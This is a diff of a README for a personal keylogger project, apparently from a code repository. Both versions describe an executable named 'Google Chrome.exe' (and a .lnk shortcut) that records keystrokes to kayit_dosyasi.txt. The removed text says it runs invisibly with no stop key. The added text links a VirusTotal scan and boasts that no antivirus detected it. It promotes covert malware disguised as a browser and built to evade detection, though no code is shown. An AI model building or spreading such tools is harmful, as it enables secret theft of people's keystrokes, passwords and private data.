@@ -1,7 +1,6 @@
 #csbkeylogger
-My Keylogger Project
+My Keylogger Project - Çiçero
 
-If you double click Google Chrome.Ink or /dist/Google Chrome.exe your keylogger will start invisible mode.
-There is no stop shortcut or key combination.You have to open task manager and kill process to stop logging.
-
-You can reach your logs data at kayit_dosyasi.txt
+If You Click Google Chrome.exe your keyboard will start logging and save them to kayit_dosyasi.txt
+Virustotal = https://www.virustotal.com/gui/file/af4e748e673d17fc2666f3e8456d049d3b15f417bd3fc689fa85b64434d1b21b/detection
+all anti-viruses could not catch it.
